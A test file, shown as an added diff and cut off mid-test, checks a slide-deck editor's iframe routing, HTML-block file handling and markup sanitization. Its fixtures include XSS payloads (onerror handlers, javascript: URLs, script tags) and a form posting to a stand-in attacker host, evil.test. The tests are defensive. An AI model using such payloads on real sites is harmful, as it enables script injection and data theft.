@@ -1,0 +1,855 @@
+/**
+ * The deck editor's frames, under jsdom: a frame of ours is shown through the
+ * editor frame route and written back as the reference the deck stores — on
+ * every write path (the live deck's per-slide serialization, the git
+ * editor's save and its diff), whatever Reveal's lazy loading did meanwhile.
+ * Also: html blocks that are files, legacy blocks shown through the preview
+ * frame, the file prompt's reference counting, the iframe panel's stored
+ * source, and slide markup cleaned where the editor and viewer insert it.
+ *
+ * Runs in the Playwright runner without a browser.
+ */
+import { readFileSync } from 'node:fs';
+import { fileURLToPath } from 'node:url';
+import { test, expect } from '@playwright/test';
+// @ts-expect-error -- jsdom ships no type declarations; only the constructor is used.
+import { JSDOM } from 'jsdom';
+import { HTML_BLOCK_SANDBOX, htmlBlockMarkup } from '@classmoji/services/slides/runtime-attrs';
+import { pageSessionMarker, sessionInertName } from '@classmoji/services/slides/safe-markup';
+
+import {
+  FRAME_MISSING_ATTR,
+  adoptPastedHtmlBlocks,
+  canonicalFrames,
+  displayFrameValue,
+  ownFilesRef,
+  readStoredIframeSrc,
+  showFrames,
+  storedFrameValue,
+  writeStoredIframeSrc,
+  type EditorFrames,
+} from '../../app/utils/editorFrames.ts';
+import { sectionFromMarkup, serializeSection } from '../../app/utils/collab/bridgeDom.ts';
+import {
+  clipboardHtml,
+  editorSlidesFragment,
+  storedSectionsHtml,
+  viewerSlidesFragment,
+} from '../../app/utils/slideMarkup.ts';
+import { LEGACY_SRCDOC_ATTR } from '../../app/utils/legacyHtmlBlocks.ts';
+import { diffDeckSnapshots, extractDeckSnapshot } from '../../app/utils/deckOpsDiff.ts';
+import {
+  htmlBlockFileNamedIn,
+  htmlBlockFileOf,
+  htmlBlockSourceOf,
+  isHtmlBlockFileShared,
+  orphanedHtmlBlockFiles,
+  repoFileProblem,
+  setHtmlBlockFile,
+  setHtmlBlockInline,
+  svgBlockSource,
+} from '../../app/components/blocks/slideBlocks.ts';
+import { createPendingFileDeletes } from '../../app/components/blocks/pendingFileDeletes.ts';
+import { watchSlideInput } from '../../app/components/blocks/useBlockRemovalWatch.ts';
+
+const jsdom = new JSDOM('<!DOCTYPE html><html><body></body></html>', {
+  url: 'https://slides.test/deck-1',
+});
+const doc: Document = jsdom.window.document;
+
+const SLIDE_ID = '9b2f1c4e-0000-4000-8000-000000000001';
+const CLASSROOM = '11111111-2222-3333-4444-555555555555';
+const CONTENT = 'https://content.test';
+const FRAMES: EditorFrames = {
+  slideId: SLIDE_ID,
+  deckFolder: 'slides/week-1',
+  classroomId: CLASSROOM,
+  repoLogin: 'cs98-org',
+  repo: 'cs98-content',
+  ourHosts: ['slides.test', 'app.test', '.classmoji.test'],
+  contentOrigin: CONTENT,
+};
+const EDITOR = `/${SLIDE_ID}/frame`;
+const REV = 'a'.repeat(40);
+const REV2 = 'b'.repeat(40);
+const BOX = { left: 10, top: 20, width: 300, height: 200 };
+const marker = pageSessionMarker();
+
+const source = (relative: string) =>
+  readFileSync(fileURLToPath(new URL(relative, import.meta.url)), 'utf8');
+
+function holder(html: string): HTMLElement {
+  const el = doc.createElement('div');
+  el.innerHTML = html;
+  return el;
+}
+
+/** A deck section as the editor shows it (sanitized, frames shown). */
+function shown(html: string, frames: EditorFrames | null = FRAMES): HTMLElement {
+  return sectionFromMarkup(doc, `<section data-cm-id="s1">${html}</section>`, {
+    frames,
+    contentOrigin: CONTENT,
+  });
+}
+
+/** Reveal's lazy load of a slide: `data-src` → `src` + `data-lazy-loaded`. */
+function revealLoads(root: Element) {
+  for (const el of Array.from(root.querySelectorAll('iframe[data-src]'))) {
+    el.setAttribute('src', el.getAttribute('data-src') as string);
+    el.setAttribute('data-lazy-loaded', '');
+    el.removeAttribute('data-src');
+  }
+}
+
+test.describe('one frame value', () => {
+  test('ours is shown through the editor route and stored relative to the deck', () => {
+    const cases: Array<[string, string, string]> = [
+      [
+        'games/snake/index.html',
+        `${EDITOR}/slides/week-1/games/snake/index.html`,
+        'games/snake/index.html',
+      ],
+      [
+        '../../games/sketchkit/draw.html?deck=x&f=y',
+        `${EDITOR}/games/sketchkit/draw.html?deck=x&f=y`,
+        '../../games/sketchkit/draw.html?deck=x&f=y',
+      ],
+      [
+        '/content/cs98-org/cs98-content/slides/week-1/games/a/index.html',
+        `${EDITOR}/slides/week-1/games/a/index.html`,
+        'games/a/index.html',
+      ],
+      [
+        'https://cs98-org.github.io/cs98-content/games/b/index.html#top',
+        `${EDITOR}/games/b/index.html#top`,
+        '../../games/b/index.html#top',
+      ],
+      [
+        `${CONTENT}/c/${CLASSROOM}/files/R1/w.1.2.sig/slides/week-1/games/c/index.html?q=1`,
+        `${EDITOR}/slides/week-1/games/c/index.html?q=1`,
+        'games/c/index.html?q=1',
+      ],
+    ];
+    for (const [stored, display, back] of cases) {
+      expect(displayFrameValue(stored, FRAMES)).toEqual({ kind: 'set', value: display });
+      expect(storedFrameValue(display, FRAMES)).toBe(back);
+      // The display form is a fixed point.
+      expect(displayFrameValue(display, FRAMES)).toEqual({ kind: 'keep' });
+    }
+  });
+
+  test('external frames are kept; app pages, scripts and other classrooms are inert', () => {
+    for (const v of ['https://www.youtube.com/embed/x', 'about:blank', '']) {
+      expect(displayFrameValue(v, FRAMES)).toEqual({ kind: 'keep' });
+    }
+    for (const v of [
+      'https://slides.test/other-deck',
+      'https://www.classmoji.test/',
+      'javascript:alert(1)',
+      `${CONTENT}/c/99999999-2222-3333-4444-555555555555/files/R/w.1.2.s/a.html`,
+      '../../../outside.html',
+      'deck.json',
+      `/other-slide/frame/slides/week-1/x.html`,
+    ]) {
+      expect(displayFrameValue(v, FRAMES)).toEqual({ kind: 'inert' });
+    }
+  });
+
+  test('a files URL of another classroom is not read as ours', () => {
+    expect(
+      ownFilesRef(`${CONTENT}/c/${CLASSROOM}/files/G/t/slides/week-1/a.html?x=1`, FRAMES)
+    ).toEqual({ repoPath: 'slides/week-1/a.html', query: '?x=1' });
+    expect(ownFilesRef(`${CONTENT}/c/other/files/G/t/a.html`, FRAMES)).toBeNull();
+    expect(
+      ownFilesRef(`https://elsewhere.test/c/${CLASSROOM}/files/G/t/a.html`, FRAMES)
+    ).toBeNull();
+  });
+});
+
+test.describe('display and back, through the live deck serialization', () => {
+  test('an iframe, a background frame and an html block file', () => {
+    const block = htmlBlockMarkup({ id: 'b1', box: BOX, src: 'blocks/ab12cd34.html', rev: REV });
+    const html =
+      '<iframe data-src="games/snake/index.html" sandbox="allow-scripts"></iframe>' +
+      '<iframe src="https://www.youtube.com/embed/x"></iframe>' +
+      block;
+    const section = sectionFromMarkup(
+      doc,
+      `<section data-cm-id="s1" data-background-iframe="../../games/bg/index.html">${html}</section>`,
+      { frames: FRAMES }
+    );
+    const [game, video, blockFrame] = Array.from(section.querySelectorAll('iframe'));
+    expect(game.getAttribute('data-src')).toBe(`${EDITOR}/slides/week-1/games/snake/index.html`);
+    expect(video.getAttribute('src')).toBe('https://www.youtube.com/embed/x');
+    expect(blockFrame.getAttribute('src')).toBe(
+      `${EDITOR}/slides/week-1/blocks/ab12cd34.html?cm-rev=${REV}`
+    );
+    expect(section.getAttribute('data-background-iframe')).toBe(`${EDITOR}/games/bg/index.html`);
+
+    const ser = serializeSection(section, FRAMES);
+    expect(ser.html).toBe(holder(html).innerHTML);
+    expect(ser.attrs['data-background-iframe']).toBe('../../games/bg/index.html');
+    expect(JSON.stringify(ser)).not.toContain('/frame/');
+  });
+
+  test("Reveal's lazy loading reduces to the stored value (loaded, mirrored, unloaded)", () => {
+    const html = '<iframe data-src="games/snake/index.html" title="g"></iframe>';
+    const stored = serializeSection(shown(html), FRAMES).html;
+    expect(stored).toBe(holder(html).innerHTML);
+
+    const loaded = shown(html);
+    revealLoads(loaded);
+    expect(loaded.querySelector('iframe')?.getAttribute('src')).toContain('/frame/');
+    expect(serializeSection(loaded, FRAMES).html).toBe(stored);
+
+    // Started without the lazy-load marker: src mirrors data-src.
+    const mirrored = shown(html);
+    const frame = mirrored.querySelector('iframe') as HTMLIFrameElement;
+    frame.setAttribute('src', frame.getAttribute('data-src') as string);
+    expect(serializeSection(mirrored, FRAMES).html).toBe(stored);
+  });
+
+  test('an html block file: its own src never stored, a new revision a new URL', () => {
+    const block = htmlBlockMarkup({ id: 'b1', box: BOX, src: 'blocks/ab12cd34.html', rev: REV });
+    const section = shown(block);
+    const el = section.querySelector('.sl-block') as HTMLElement;
+    setHtmlBlockFile(el, { src: 'blocks/ab12cd34.html', rev: REV2 }, FRAMES);
+    expect(el.querySelector('iframe')?.getAttribute('src')).toBe(
+      `${EDITOR}/slides/week-1/blocks/ab12cd34.html?cm-rev=${REV2}`
+    );
+    const ser = serializeSection(section, FRAMES).html ?? '';
+    expect(ser).toContain(`data-cm-src="blocks/ab12cd34.html" data-cm-rev="${REV2}"`);
+    expect(ser).not.toMatch(/\ssrc=|srcdoc|\/frame\//);
+    expect(htmlBlockSourceOf(el)).toEqual({ kind: 'file', src: 'blocks/ab12cd34.html', rev: REV2 });
+  });
+
+  test('an html block whose sandbox would let it out shows nothing', () => {
+    const block = htmlBlockMarkup({ id: 'b1', box: BOX, src: 'blocks/ab12cd34.html', rev: REV });
+    const unsafe = block.replace(
+      `sandbox="${HTML_BLOCK_SANDBOX}"`,
+      'sandbox="allow-scripts allow-same-origin"'
+    );
+    const section = shown(unsafe);
+    expect(section.querySelector('iframe')?.hasAttribute('src')).toBe(false);
+    expect(serializeSection(section, FRAMES).html).toBe(holder(unsafe).innerHTML);
+  });
+
+  test('a frame that must not load is renamed for display and stored as authored', () => {
+    const html = '<iframe src="https://app.test/admin" title="x"></iframe>';
+    const section = shown(html);
+    const frame = section.querySelector('iframe') as HTMLIFrameElement;
+    expect(frame.hasAttribute('src')).toBe(false);
+    expect(frame.getAttribute(sessionInertName(marker, 'src'))).toBe('https://app.test/admin');
+    expect(serializeSection(section, FRAMES).html).toBe(holder(html).innerHTML);
+  });
+
+  test('a legacy html block shows through the preview frame and is stored byte for byte', () => {
+    const block = htmlBlockMarkup({ id: 'b1', box: BOX, source: '<p>1 &lt; 2</p>' });
+    const section = shown(block);
+    const frame = section.querySelector('iframe') as HTMLIFrameElement;
+    expect(frame.hasAttribute('srcdoc')).toBe(false);
+    expect(frame.getAttribute('src')).toBe(`${CONTENT}/preview-frame`);
+    expect(frame.getAttribute(LEGACY_SRCDOC_ATTR)).toContain('<p>1 &lt; 2</p>');
+    expect(serializeSection(section, FRAMES).html).toBe(holder(block).innerHTML);
+    // Without a frame context (local development) it is left inline.
+    const local = sectionFromMarkup(doc, `<section data-cm-id="s1">${block}</section>`);
+    expect(local.querySelector('iframe')?.hasAttribute('srcdoc')).toBe(true);
+  });
+
+  test('without a frame context frames are shown as stored', () => {
+    const html = '<iframe data-src="games/snake/index.html"></iframe>';
+    const section = shown(html, null);
+    expect(section.querySelector('iframe')?.getAttribute('data-src')).toBe(
+      'games/snake/index.html'
+    );
+    expect(serializeSection(section, null).html).toBe(holder(html).innerHTML);
+  });
+
+  test('showFrames is idempotent (a frame already shown is not touched)', () => {
+    const section = shown('<iframe data-src="games/a.html"></iframe>');
+    const before = section.outerHTML;
+    showFrames(section, FRAMES);
+    expect(section.outerHTML).toBe(before);
+  });
+});
+
+test.describe("the git editor's save and its diff", () => {
+  const STORED =
+    '<section data-cm-id="s1"><h2>One</h2>' +
+    '<iframe data-src="/content/cs98-org/cs98-content/slides/week-1/games/a/index.html"></iframe>' +
+    '</section><section data-cm-id="s2"><p>Two</p></section>';
+
+  function editorDeck(): HTMLElement {
+    const slides = doc.createElement('div');
+    slides.className = 'slides';
+    slides.replaceChildren(editorSlidesFragment(STORED, doc, { frames: FRAMES }));
+    return slides;
+  }
+
+  test('no editor URL reaches what a save posts', () => {
+    const slides = editorDeck();
+    expect(slides.innerHTML).toContain('/frame/');
+    revealLoads(slides);
+    const posted = storedSectionsHtml(slides, FRAMES);
+    expect(posted).not.toContain('/frame/');
+    expect(posted).toContain('games/a/index.html');
+  });
+
+  test('a deck merely viewed in the editor diffs as unchanged', () => {
+    const parse = (html: string) => {
+      const parsed = new jsdom.window.DOMParser().parseFromString(html, 'text/html') as Document;
+      canonicalFrames(parsed.body, FRAMES);
+      return parsed;
+    };
+    const base = extractDeckSnapshot(`<div class="slides">${STORED}</div>`, parse);
+    const posted = `<div class="slides">${storedSectionsHtml(editorDeck(), FRAMES)}</div>`;
+    const curr = extractDeckSnapshot(posted, parse);
+    expect(base && curr && diffDeckSnapshots(base, curr)).toEqual([]);
+  });
+});
+
+test.describe('html block files: the delete prompt and forks count references', () => {
+  const deckWith = (...srcs: Array<string | null>) =>
+    holder(
+      srcs
+        .map((src, i) =>
+          src
+            ? `<section>${htmlBlockMarkup({ id: `b${i}`, box: BOX, src, rev: REV })}</section>`
+            : `<section>${htmlBlockMarkup({ id: `b${i}`, box: BOX, source: 'x' })}</section>`
+        )
+        .join('')
+    );
+
+  test('a removed block whose file no block names any more', () => {
+    const deck = deckWith('blocks/aaaaaaaa.html', 'blocks/bbbbbbbb.html', 'blocks/bbbbbbbb.html');
+    const [first, second] = Array.from(deck.querySelectorAll('section'));
+    first.remove();
+    second.remove();
+    // The second file is still named by the third block.
+    expect(orphanedHtmlBlockFiles([first, second], deck)).toEqual(['blocks/aaaaaaaa.html']);
+  });
+
+  test('a slide with several blocks, a repo file and a legacy block', () => {
+    const deck = deckWith(null);
+    const slide = holder(
+      htmlBlockMarkup({ id: 'b1', box: BOX, src: 'blocks/cccccccc.html', rev: REV }) +
+        htmlBlockMarkup({ id: 'b2', box: BOX, src: 'games/snake/index.html' }) +
+        htmlBlockMarkup({ id: 'b3', box: BOX, src: 'blocks/cccccccc.html', rev: REV }) +
+        htmlBlockMarkup({ id: 'b4', box: BOX, source: 'y' })
+    );
+    // Only `blocks/` files are asked about, each once.
+    expect(orphanedHtmlBlockFiles([slide], deck)).toEqual(['blocks/cccccccc.html']);
+  });
+
+  test('a copy shares its file until its first Apply forks it', () => {
+    const deck = deckWith('blocks/aaaaaaaa.html', 'blocks/aaaaaaaa.html', 'blocks/dddddddd.html');
+    const [one, , three] = Array.from(deck.querySelectorAll('.sl-block'));
+    expect(isHtmlBlockFileShared(one, 'blocks/aaaaaaaa.html', deck)).toBe(true);
+    expect(isHtmlBlockFileShared(three, 'blocks/dddddddd.html', deck)).toBe(false);
+    expect(htmlBlockFileNamedIn('blocks/dddddddd.html', deck)).toBe(true);
+    expect(htmlBlockFileNamedIn('blocks/eeeeeeee.html', deck)).toBe(false);
+  });
+
+  test('a repo file path is checked against the repository', async () => {
+    const listed: string[] = [];
+    const list = async (folder: string) => {
+      listed.push(folder);
+      return { entries: [{ path: 'games/snake/index.html', type: 'file' }] };
+    };
+    expect(
+      await repoFileProblem('../../games/snake/index.html?x=1', 'slides/week-1', list)
+    ).toBeNull();
+    expect(listed).toEqual(['games/snake']);
+    expect(await repoFileProblem('../../games/snake/other.html', 'slides/week-1', list)).toBe(
+      'Not found: ../../games/snake/other.html'
+    );
+    expect(await repoFileProblem('https://x.test/a.html', 'slides/week-1', list)).toMatch(
+      /^This path cannot be used/
+    );
+    expect(await repoFileProblem('deck.json', 'slides/week-1', list)).toMatch(
+      /^This path cannot be used/
+    );
+  });
+});
+
+test.describe('the iframe panel edits the stored source', () => {
+  test('src, data-src, and data-src while Reveal has it loaded', () => {
+    for (const [html, attr] of [
+      ['<iframe src="games/a.html" sandbox="allow-scripts"></iframe>', 'src'],
+      ['<iframe data-src="games/a.html" sandbox="allow-scripts"></iframe>', 'data-src'],
+    ] as const) {
+      const section = shown(html);
+      const frame = section.querySelector('iframe') as HTMLIFrameElement;
+      expect(readStoredIframeSrc(frame, FRAMES)).toBe('games/a.html');
+      if (attr === 'data-src') revealLoads(section);
+      expect(readStoredIframeSrc(frame, FRAMES)).toBe('games/a.html');
+
+      writeStoredIframeSrc(frame, '../../games/b/index.html', FRAMES);
+      expect(readStoredIframeSrc(frame, FRAMES)).toBe('../../games/b/index.html');
+      // Nothing else changed: the sandbox stays, the shown value is the editor's.
+      expect(frame.getAttribute('sandbox')).toBe('allow-scripts');
+      expect(JSON.stringify(serializeSection(section, FRAMES))).toContain(
+        `data-src` === attr
+          ? 'data-src=\\"../../games/b/index.html\\"'
+          : 'src=\\"../../games/b/index.html\\"'
+      );
+
+      writeStoredIframeSrc(frame, 'https://www.youtube.com/embed/x', FRAMES);
+      expect(readStoredIframeSrc(frame, FRAMES)).toBe('https://www.youtube.com/embed/x');
+      expect(serializeSection(section, FRAMES).html).not.toContain('/frame/');
+    }
+  });
+
+  test('a value that must not load is kept, inert, and stored as typed', () => {
+    const section = shown('<iframe src="about:blank"></iframe>');
+    const frame = section.querySelector('iframe') as HTMLIFrameElement;
+    writeStoredIframeSrc(frame, 'https://app.test/x', FRAMES);
+    expect(frame.hasAttribute('src')).toBe(false);
+    expect(readStoredIframeSrc(frame, FRAMES)).toBe('https://app.test/x');
+    expect(serializeSection(section, FRAMES).html).toBe(
+      '<iframe src="https://app.test/x"></iframe>'
+    );
+  });
+
+  test('new iframes and the panel share one default sandbox', () => {
+    expect(source('../../app/components/SlideToolbar.tsx')).toContain(
+      "iframe.setAttribute('sandbox', DEFAULT_IFRAME_SANDBOX)"
+    );
+    expect(source('../../app/components/properties/editors/IframeProperties.tsx')).toContain(
+      "label: 'Scripts + Same Origin + Forms + Popups (default)'"
+    );
+  });
+});
+
+test.describe('slide markup is cleaned where it is inserted', () => {
+  const HOSTILE =
+    '<section><img src="x" onerror="window.__spy.push(1)"><a href="javascript:void(0)">a</a>' +
+    '<script>window.__spy.push(2)</script></section>';
+
+  test('the viewer: nothing runs, nothing to restore', () => {
+    const live = new JSDOM('<!doctype html><body><div class="slides"></div></body>', {
+      runScripts: 'dangerously',
+    });
+    const win = live.window as unknown as Window & { __spy: number[] };
+    win.__spy = [];
+    const slides = win.document.querySelector('.slides') as Element;
+    slides.replaceChildren(viewerSlidesFragment(HOSTILE, win.document, {}));
+    for (const el of Array.from(slides.querySelectorAll('*'))) {
+      el.dispatchEvent(new (live.window as unknown as typeof globalThis).Event('error'));
+    }
+    expect(win.__spy).toEqual([]);
+    expect(slides.innerHTML).not.toMatch(/onerror|javascript:|<script/);
+  });
+
+  test('the editor: shown inert, written back as authored', () => {
+    const slides = doc.createElement('div');
+    slides.replaceChildren(editorSlidesFragment(HOSTILE, doc, { frames: FRAMES }));
+    expect(slides.querySelector('img')?.hasAttribute('onerror')).toBe(false);
+    expect(slides.querySelector('script')).toBeNull();
+    expect(storedSectionsHtml(slides, FRAMES)).toBe(holder(HOSTILE).innerHTML);
+  });
+
+  test('every sink inserts nodes, never markup', () => {
+    const slides = source('../../app/components/RevealSlides.tsx');
+    expect(slides).not.toMatch(/\.innerHTML\s*=\s*htmlContent/);
+    expect(slides).toContain('slidesContainer.replaceChildren(');
+    // Reveal's cross-window API stays off: locked options last, guards first.
+    const init = slides.slice(slides.indexOf('const deck = new Reveal('));
+    expect(init.slice(0, init.indexOf('});'))).toMatch(/\.\.\.REVEAL_LOCKED_OPTIONS,\s*$/);
+    const before = slides.slice(0, slides.indexOf('const deck = new Reveal('));
+    expect(before).toContain('stripRevealQueryConfig();');
+    expect(before).toContain('installRevealMessageGuard();');
+
+    expect(source('../../app/components/SlideOverview/SlideThumbnail.tsx')).not.toContain(
+      'dangerouslySetInnerHTML'
+    );
+    expect(source('../../app/components/SlideNotesPanel.tsx')).not.toMatch(/\.innerHTML\s*=/);
+    expect(source('../../app/components/SlideToolbar.tsx')).not.toContain(
+      'content.innerHTML = snippet.content'
+    );
+  });
+});
+
+test.describe('frames that show nothing get a placeholder, never stored', () => {
+  test('a frame shown inert, and an html block that shows nothing, are marked', () => {
+    const html = '<iframe src="https://app.test/admin" title="x"></iframe>';
+    const section = shown(html);
+    expect(section.querySelector('iframe')?.getAttribute(FRAME_MISSING_ATTR)).toBe('1');
+    expect(serializeSection(section, FRAMES).html).toBe(holder(html).innerHTML);
+
+    const block = htmlBlockMarkup({ id: 'b1', box: BOX, src: 'blocks/ab12cd34.html', rev: REV });
+    const unsafe = block.replace(`sandbox="${HTML_BLOCK_SANDBOX}"`, 'sandbox="allow-same-origin"');
+    const blockSection = shown(unsafe);
+    expect(blockSection.querySelector('iframe')?.getAttribute(FRAME_MISSING_ATTR)).toBe('1');
+    expect(serializeSection(blockSection, FRAMES).html).toBe(holder(unsafe).innerHTML);
+  });
+
+  test('a frame that loads is not marked', () => {
+    const section = shown(
+      '<iframe src="games/a.html"></iframe>' +
+        htmlBlockMarkup({ id: 'b1', box: BOX, src: 'blocks/ab12cd34.html', rev: REV })
+    );
+    expect(section.querySelectorAll(`[${FRAME_MISSING_ATTR}]`)).toHaveLength(0);
+  });
+
+  test('the panel marks a value that must not load, and unmarks one that does', () => {
+    const section = shown('<iframe src="games/a.html"></iframe>');
+    const frame = section.querySelector('iframe') as HTMLIFrameElement;
+    writeStoredIframeSrc(frame, 'javascript:alert(1)', FRAMES);
+    expect(frame.getAttribute(FRAME_MISSING_ATTR)).toBe('1');
+    writeStoredIframeSrc(frame, 'games/b.html', FRAMES);
+    expect(frame.hasAttribute(FRAME_MISSING_ATTR)).toBe(false);
+    expect(serializeSection(section, FRAMES).html).toBe('<iframe src="games/b.html"></iframe>');
+  });
+
+  test('the stylesheet styles the mark, light and dark', () => {
+    const css = source('../../app/styles/global.css');
+    expect(css).toContain('.reveal iframe[data-cm-missing] {');
+    expect(css).toContain('.dark .reveal iframe[data-cm-missing] {');
+    expect(css).toContain('Embedded content unavailable');
+  });
+});
+
+test.describe('the iframe panel with src mirroring data-src', () => {
+  test('both move together, and one value is stored', () => {
+    // A frame Reveal loaded without its lazy-load mark: src mirrors data-src.
+    const section = shown('<iframe data-src="games/a.html" src="games/a.html"></iframe>');
+    const frame = section.querySelector('iframe') as HTMLIFrameElement;
+    writeStoredIframeSrc(frame, 'games/b.html', FRAMES);
+    expect(frame.getAttribute('src')).toBe(`${EDITOR}/slides/week-1/games/b.html`);
+    expect(frame.getAttribute('data-src')).toBe(frame.getAttribute('src'));
+    expect(serializeSection(section, FRAMES).html).toBe(
+      '<iframe data-src="games/b.html"></iframe>'
+    );
+
+    // Made inert: neither loads, the typed value is stored.
+    writeStoredIframeSrc(frame, 'https://app.test/x', FRAMES);
+    expect(frame.hasAttribute('src')).toBe(false);
+    expect(frame.hasAttribute('data-src')).toBe(false);
+    expect(serializeSection(section, FRAMES).html).toBe(
+      '<iframe data-src="https://app.test/x"></iframe>'
+    );
+  });
+});
+
+test.describe('copy and paste across decks', () => {
+  const OTHER_ID = '9b2f1c4e-0000-4000-8000-000000000002';
+
+  test("a block copied from another deck keeps naming that deck's file", () => {
+    // As the other deck's editor showed it (its URL carries the repo path).
+    const pasted = holder(
+      htmlBlockMarkup({ id: 'b1', box: BOX, src: 'blocks/ab12cd34.html', rev: REV }).replace(
+        '<iframe ',
+        `<iframe src="/${OTHER_ID}/frame/slides/week-2/blocks/ab12cd34.html?cm-rev=${REV}" `
+      ) + htmlBlockMarkup({ id: 'b2', box: BOX, src: 'blocks/eeeeeeee.html', rev: REV2 })
+    );
+    showFrames(pasted.lastElementChild as Element, FRAMES);
+    adoptPastedHtmlBlocks(pasted, FRAMES);
+    showFrames(pasted, FRAMES);
+    const [copied, own] = Array.from(pasted.querySelectorAll('.sl-block'));
+    expect(copied.querySelector('iframe')?.getAttribute('data-cm-src')).toBe(
+      '../week-2/blocks/ab12cd34.html'
+    );
+    expect(copied.querySelector('iframe')?.getAttribute('src')).toBe(
+      `${EDITOR}/slides/week-2/blocks/ab12cd34.html?cm-rev=${REV}`
+    );
+    expect(htmlBlockSourceOf(copied)).toEqual({
+      kind: 'copied',
+      src: '../week-2/blocks/ab12cd34.html',
+      rev: REV,
+    });
+    // Not this deck's file: never offered for deletion here.
+    expect(htmlBlockFileOf(copied)).toBeNull();
+    // A block of this deck is unchanged.
+    expect(own.querySelector('iframe')?.getAttribute('data-cm-src')).toBe('blocks/eeeeeeee.html');
+  });
+
+  test('a plain frame copied from another deck shows and stores relative to this deck', () => {
+    const pasted = holder(
+      `<iframe data-src="/${OTHER_ID}/frame/slides/week-2/games/a/index.html?x=1"></iframe>`
+    );
+    showFrames(pasted, FRAMES);
+    expect(pasted.querySelector('iframe')?.getAttribute('data-src')).toBe(
+      `${EDITOR}/slides/week-2/games/a/index.html?x=1`
+    );
+    const section = doc.createElement('section');
+    section.append(...Array.from(pasted.childNodes));
+    expect(serializeSection(section, FRAMES).html).toBe(
+      '<iframe data-src="../week-2/games/a/index.html?x=1"></iframe>'
+    );
+  });
+
+  test("the clipboard carries the authored form, never this page's markers", () => {
+    const section = shown(
+      '<p>hi</p><img src="x.png" onerror="alert(1)">' +
+        '<iframe src="https://app.test/admin"></iframe>' +
+        '<iframe src="games/a.html"></iframe>' +
+        htmlBlockMarkup({ id: 'b9', box: BOX, source: '<p>legacy</p>' })
+    );
+    expect(section.innerHTML).toContain(marker);
+    const contents = doc.createDocumentFragment();
+    for (const child of Array.from(section.childNodes)) contents.append(child.cloneNode(true));
+    const copied = clipboardHtml(contents, doc);
+    expect(copied).not.toContain(marker);
+    expect(copied).not.toContain(FRAME_MISSING_ATTR);
+    expect(copied).not.toContain(LEGACY_SRCDOC_ATTR);
+    expect(copied).toContain('onerror="alert(1)"');
+    expect(copied).toContain('src="https://app.test/admin"');
+    expect(copied).toContain('srcdoc=');
+    // Frames of ours keep the editor URL: it carries the repo path.
+    expect(copied).toContain(`src="${EDITOR}/slides/week-1/games/a.html"`);
+    // The live slide is untouched.
+    expect(section.innerHTML).toContain(marker);
+  });
+
+  test('copy and cut are handled while editing; a cut never asks about files', () => {
+    const watch = source('../../app/components/blocks/useBlockRemovalWatch.ts');
+    expect(watch).toContain("doc.addEventListener('copy', onCopyOrCut, true)");
+    expect(watch).toContain("doc.addEventListener('cut', onCopyOrCut, true)");
+    expect(watch).toContain("inputType !== 'deleteByCut'");
+    expect(watch).toContain('return watchSlideInput(document, {');
+  });
+});
+
+test.describe('a paste or drop is held to the lists as it lands', () => {
+  const OTHER_ID = '9b2f1c4e-0000-4000-8000-000000000002';
+  const AUTHORED =
+    '<p onclick="window.__spy.push(1)">copy me</p>' +
+    '<img src="x.png" onerror="window.__spy.push(2)">' +
+    '<form action="https://evil.test/collect"><input name="q" onfocus="window.__spy.push(3)"></form>' +
+    '<iframe src="https://app.test/admin"></iframe>' +
+    '<script>window.__spy.push(4)</script>';
+
+  /** An editor page: its deck, the input watch, and a paste of `markup` after the first paragraph. */
+  function editorPage() {
+    const live = new JSDOM(
+      '<!doctype html><body><div class="reveal"><div class="slides">' +
+        '<section data-cm-id="t1"><p>target</p></section></div></div></body>',
+      { url: 'https://slides.test/deck-1', runScripts: 'dangerously' }
+    );
+    const win = live.window as unknown as Window & typeof globalThis & { __spy: number[] };
+    win.__spy = [];
+    const ldoc = win.document;
+    const stop = watchSlideInput(ldoc, { onRemoved: () => {}, frames: () => FRAMES });
+    const section = ldoc.querySelector('section') as HTMLElement;
+    const insert = (markup: string, inputType = 'insertFromPaste') => {
+      const at = section.querySelector('p') as HTMLElement;
+      at.dispatchEvent(new win.InputEvent('beforeinput', { inputType, bubbles: true }));
+      // As the browser inserts it: parsed, then put in the live slide.
+      const parsed = ldoc.createElement('template');
+      parsed.innerHTML = markup;
+      at.after(parsed.content);
+      at.dispatchEvent(new win.InputEvent('input', { inputType, bubbles: true }));
+    };
+    return { win, section, insert, stop };
+  }
+
+  test('copied from a slide, pasted: nothing in it runs, loads or submits', () => {
+    const copiedFrom = shown(AUTHORED);
+    const contents = doc.createDocumentFragment();
+    for (const child of Array.from(copiedFrom.childNodes)) contents.append(child.cloneNode(true));
+    const copied = clipboardHtml(contents, doc);
+    expect(copied).toContain('onclick=');
+
+    const { win, section, insert, stop } = editorPage();
+    insert(copied);
+
+    for (const el of Array.from(section.querySelectorAll('*'))) {
+      for (const type of ['click', 'error', 'focus']) el.dispatchEvent(new win.Event(type));
+    }
+    expect(win.__spy).toEqual([]);
+    expect(section.querySelector('[onclick], [onerror], [onfocus]')).toBeNull();
+    expect(section.querySelector('form')).toBeNull();
+    expect(section.querySelector('script')).toBeNull();
+    expect(section.querySelector('iframe')?.hasAttribute('src')).toBe(false);
+    expect(
+      section
+        .querySelector('p')
+        ?.nextElementSibling?.getAttribute(sessionInertName(marker, 'onclick'))
+    ).toBe('window.__spy.push(1)');
+    // Written back exactly as authored.
+    expect(serializeSection(section, FRAMES).html).toBe(`<p>target</p>${AUTHORED}`);
+    stop();
+  });
+
+  test("an html block from another deck still names that deck's file", () => {
+    const block = htmlBlockMarkup({
+      id: 'b1',
+      box: BOX,
+      src: 'blocks/ab12cd34.html',
+      rev: REV,
+    }).replace(
+      '<iframe ',
+      `<iframe src="/${OTHER_ID}/frame/slides/week-2/blocks/ab12cd34.html?cm-rev=${REV}" `
+    );
+    const { section, insert, stop } = editorPage();
+    insert(block);
+    const frame = section.querySelector('.sl-block iframe');
+    expect(frame?.getAttribute('data-cm-src')).toBe('../week-2/blocks/ab12cd34.html');
+    expect(frame?.getAttribute('src')).toBe(
+      `${EDITOR}/slides/week-2/blocks/ab12cd34.html?cm-rev=${REV}`
+    );
+    stop();
+  });
+
+  test('markup already shown by this page (a drag inside the deck) is not hidden twice', () => {
+    const dragged = shown(AUTHORED).innerHTML;
+    expect(dragged).toContain(`data-cm-inert-node="${marker}"`);
+    const { section, insert, stop } = editorPage();
+    insert(dragged, 'insertFromDrop');
+    const holders = Array.from(section.querySelectorAll('template[data-cm-inert-node]'));
+    expect(holders.length).toBeGreaterThan(0);
+    for (const held of holders) {
+      expect((held as HTMLTemplateElement).content.querySelector('template')).toBeNull();
+    }
